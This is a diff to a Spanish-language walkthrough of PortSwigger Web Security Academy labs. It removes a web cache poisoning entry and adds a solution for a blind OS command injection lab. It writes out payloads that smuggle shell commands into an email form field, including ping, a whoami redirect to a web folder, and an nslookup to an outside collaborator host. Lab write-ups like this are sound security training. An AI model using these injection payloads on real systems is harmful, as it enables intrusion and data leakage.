@@ -17,11 +17,10 @@
 13. [Access control vulnerabilities](#access-control-vulnerabilities)
 14. [Authentication](#authentication)
 15. [WebSockets](#webSockets)
-16. [Web cache poisoning](#web-cache-poisoning)
-17. [Insecure deserialization](#insecure-deserialization)
-18. [Information disclosure](#information-disclosure)
-19. [Business logic vulnerabilities](#business-logic-vulnerabilities)
-20. [HTTP Host header attacks](#http-host-header-attacks)
+16. [Insecure deserialization](#insecure-deserialization)
+17. [Information disclosure](#information-disclosure)
+18. [Business logic vulnerabilities](#business-logic-vulnerabilities)
+19. [HTTP Host header attacks](#http-host-header-attacks)
 
 ---
 
@@ -103,7 +102,7 @@
 #### Solución
 
 1. Enviar un mensaje de feedback y capturar la request
-2. Setear el parámetro email=||ping+-c+10+127.0.0.1||
+2. Setear el parámetro email=||ping -c 10 127.0.0.1||
 
 ### [Blind OS command injection with output redirection](https://portswigger.net/web-security/os-command-injection/lab-blind-output-redirection)
 
@@ -112,6 +111,13 @@
 1. Enviar un mensaje de feedback y capturar la request
 2. Setear el parámetro email=||whoami>/var/www/images/file.txt||
 3. Acceder a https://LABID.web-security-academy.net/image?filename=file.txt
+
+### [Blind OS command injection with out-of-band interaction](https://portswigger.net/web-security/os-command-injection/lab-blind-out-of-band)
+
+#### Solución
+
+1. Enviar un mensaje de feedback y capturar la request
+2. Setear el parámetro email=||nslookup burpcollaborator.net||
 
 ---
 
@@ -377,10 +383,6 @@ La funcionalidad de cambio de contraseña especifica en la request el usuario qu
 ---
 
 ## [WebSockets](https://portswigger.net/web-security/websockets)
-
----
-
-## [Web cache poisoning](https://portswigger.net/web-security/web-cache-poisoning)
 
 ---
 
